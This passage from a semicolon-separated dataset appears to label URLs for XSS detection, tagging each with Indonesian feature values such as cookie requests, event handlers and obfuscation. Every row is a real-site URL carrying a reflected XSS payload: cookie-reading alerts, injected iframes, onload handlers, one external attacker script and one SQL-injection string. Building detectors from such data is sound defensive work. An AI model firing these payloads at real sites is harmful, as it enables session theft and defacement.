duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.ebay.com/itm/ws/eBayISAPI.dll?ViewItem&rt=nc&item=181023275832&si=gGZ3pf0PeJXSxz0i4IMd7G4Xu2Q%3D&print=all&category=172602;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.ebay.com/sch/i.html?_from=R40&_trksid=m570.l1313&_nkw=%27%22type=%22image%22%20src=%22XSS.jpg%22%20onerror=%22alert%28document.cookie%29%22%20c=%22&_sacat=15032;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Terdapat EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.eia.org.uk/view.php?id=948%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.elhacker.org/index.php?Ver=WebsHackeadas&botnot=16%22%3E%3Ciframe%20onload=alert%28/XSS/%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.engadget.com/galleries/tag/%3Cbody%20onload=alert(String.fromCharCode(88,83,83))%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.enjoy.net.mm/detail/detail.php?id=11472&type=news%27%22%3E%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.europcar.bg/cgi-bin/feedback.cgi?LANG=\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.europcarug.com/cgi-bin/feedback.cgi?LANG=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.europeana.eu/portal/search.html?query=%3C%2Ftitle%3E+%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.evangelkium.de/web/index.php?option=com_search&searchword=aaa&searchphrase=any&ordering=newest%22%20onmouseover={alert%28/Guess_we_are_behind_enemy_lines/%29}%20onmouseout=alert%28document.cookie%29%20style=position:fixed;top:33%;left:33%;width:33%;height:33%;%22\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.events.scientology.org/events/invite.html?id=%3Cimg%20src=%22http://encyclopediadramatica.ch/images/5/5e/Xenu_volcanoes.jpg%22%3E%20%3Cscript%3Ealert(%22Xenu,%20in%20my%20volcanoes?%22)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.exploitsearch.net/?q=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.expopakistan.gov.pk/mission-admin/login.php?err=%3Ch1%3EXssed%20by%20NE0%20from%20CyBER-71%20Bangladesh%3C/h1%3E%3Ciframe%20src=//xssed.com%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.exportersindia.com/search.php?term=%27+%22%3E%3Ciframe+src%3D%22http%3A//www.crazybucket.in%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.fafich.ufmg.br/fil/busca.htm?srchtxt=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&srchlst=bd1.js&redirecionar=_top&sitesporpg=5&pagina=0;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.fbi.com/?not_found=%3Ch1%3EXSS%20BY%20Mr.M4D3RS%3C/h1%3E%3Cscript%3Ealert%28document.cook ie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.feedage.com/subscribe.php?fid=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.fema.gov/library/viewRecord.do?id=<script>alert('XSS');</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.fenykepesajandek.eu/index.php?page=register&nev=\"\">&email=aa%40aa.aa&pass1=qwerty&pass2=qwerty&i r=1337&lakhely=aa&utca=aa&tel=aa&hirlevel=1&regisztracio=Regisztr%E1ci%F3+ind%EDt%E1sa\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.forexticket.fr/fr/conversion/monnaie-EUR-USD?montant=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&dev1=EUR&dev2=USD&Submit=Go&resultat=130.57 01;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.forth.gr/ncp/search.php?query=\"\"><iframe/src=http://XSSed.com>&search_query=Search\";Kurang dari 54;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.francecars.fr/compte.php?action=connexion&email=/\"\">&pass=ljkv&input_connexion.x=0&input_connexion.y=0\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.galatasaray.org/cnt.php?url=http://bit.ly/inbQKv;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.gallimard.fr/Gallimard-cgi/Appli_catal/liste.pl?fctx=1329503444&BMin=31&BMax=38&flag=&tri=ac&rub=collection&nucol=103000000&nb_T=38\"\"><script>alert('XSS By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.gdn.edu/athletics/article.asp?NewsNo=-1+union+select+%22%3Cscript%3Ealert%281%29;%3C/script%3E%22,2,3,4,5,6,7,8,9,10,11,12+from+News\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.gectchem.org/error.asp?msg=<iframe src=\"\"http://xssed.com\"\">\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.ghana50.gov.gh/tourism/index.php?op=getAshantisiteInfo&id=%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.gngfootball.org/chat/upgrade.php?step=4%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.gordoman.de/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.grass-arts.com/shop.php?image=38%22%3E%3Ciframe%20src=http://r14nulr00t.blogspot.com%20%3C/iframe%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.gtgroup.ge/php_thumb/demo/phpThumb.demo.demo.php/%22onmouseover=prompt%28903901%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.gulp.de/cgi-gulp/robot.exe/SSEEK?txtvToken=&txtvCaller=<script>alert(navigator.userAgent)</script>;Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.hbeu1.hsbc.com/ukservices/branchlocator/area.asp?area=%27%22%3E%3Cmarquee%3E%3Cimg%20src=k.png%20onerror=alert(/XSS/.source)%20/%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.hcltech.com/search/apachesolr_search/%3Cfont%20size=24%20color=red%3EAnshul%20katta%20found%20XSS%3C/font%3E%3Ciframe%20src=%22http://anshulkatta.blogspot.com%22%3E%3C/iframe%3E%3Cscript%3Ealert%28%22anshul%20katta%20found%20XSS%22%29;alert%28document.cookie%29%3C/script%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.healthkart.com/search?query=\"\"/><script>alert(\"\"XSS:Vijayendra\"\")</script>&search.x=0&search.y=0\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.homeshop18.com/shop/faces/jsp/search.jsp?q=%22/%3E%3C/script%3E%3Cscript%3Ealert(%22Xss%20:%20Vijayendra%22)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.hostelhelvetia.pl/index.php?page=%22/%3E%3Cbody%20onload=alert%281%29%3E&lang=en;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.hp.com/cgi-bin/hpinfo/cserreport.cgi?Send_To=strategic.messaging%40hp.com&q3a_comment&q4b_comment&q4c_comment&q4d_comment&q4e_comment&q5_ comment&q8k&q9&q6&q7&q1=brochure&q2=1&q3a=3&q3b=3&q3c=1&q3d=2&q3e=4&q4=3&q5=3&Submit=Submit&Say_Than ks_URL=http%3A//www.alpacahack.com/p/xss.html;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.hzd.de/irj/HZD_Internet?cid=7ec7f019ceb02fc4a3ff781ae0159923&MailFormsAction=submit%22//--%3E%20%3Cimg%20src=x%20onerror=alert(document.cookie)%3E%3C!--;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://www.ibk.co.kr/common/error/browser.jsp?returnURL=\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.iibf.org.in/scripts/SearchResults.asp?sitequery=%22%2F%3E%3Cscript%3Ealert%28%22XSS%3A+Vijayendra%22%29%3C%2Fscript%3E&x=22&y=7;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.imagebankexpress.com/4615/Chicken-TR/chickvid-720x300-p69-clicktag-tr.swf?clickTag=http://www.imagebankexpress.com/4615/Chicken-TR/chickvid-720x300-p69-clicktag-tr.swf?clickTag=javascript:alert(%22XSSED%22);\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.imdb.com/find?q=xss&pg=tvschedule\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://www.immobiliere-capyvelines.fr/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.immobilieredecatalogne.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.immobiliere-michel-vautier.fr/index.php?lang=fr/%22%3E%3Cscript%3Ealert(%27Xss%20By%20Atm0n3r%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.immobilierhautsdevaugrenier.com/index.php?lang=fr/%22%3E%3Cscript%3Ealert(%27Xss%20By%20Atm0n3r%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.immobilier-paris-verneuil.com/index.php?lang=fr/%22%3E%3Cscript%3Ealert(%27Xss%20By%20Atm0n3r%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.immobilier-pro-maroc.com/index.php?mod=annonce&reference=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&x=6&y=7;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.immodirekt.at/pics/uploads/diepresse_click.swf?clickTag=javascript:window.open(%27http://ww%20w.xssed.com%27);%20alert(%27XSSED%20by%20Viper.aT%27)\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://www.immo-du-sud.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.immovisionfrance.com/immo-uzes/index.php?lang=fr/%22%3E%3Cscript%3Ealert(%27Xss%20By%20Atm0n3r%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.imvisible.info/contact-us.php?comment=11&email=11&hidden_spam_filter=72021B05481A336D481B22241DB299C2&hncaptcha=753514325849512 86999272589517356&hncaptcha_private_key=&hncaptcha_public_key=bfc&name=11&sent=true&subject=11;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.i-mxms.com/SearchResults.aspx?Search=aaa%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.indiatimes.com/search/</title><script>alert(navigator.userAgent)</script>;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.inreda.com/showProductsDetail.asp?pID=10653&cID=67&agrID='';!--\"\"onclick=\"\"alert('XSS')\"\"=&{()}\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.integrativetherapy.com/en/articles.php?id=32%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.ipodsoft.com/site/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.iut.univ-lille3.fr/~apreux/pmwiki/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.jabong.com/catalog/?q=%22/%3E%3C/script%3E%3Cscript%3Ealert(%22Xss:Vijayendra%22)%3C/script%3E&submit=&baseUrl=;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.jagd-wiki.org/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.jaring.my/selfcare/index.cfm?cont=error&skip=1&type=noentry&msg=%22%3E%3Cscript%20src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js%3E%3C/script%3E%3E&CFID=518552;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.jeudepaume.org/index.php?page=--%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Ciframe%20src=http://xssed.com%3E%3C/iframe%3Earticle&idArt=1470&lieu=1;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript 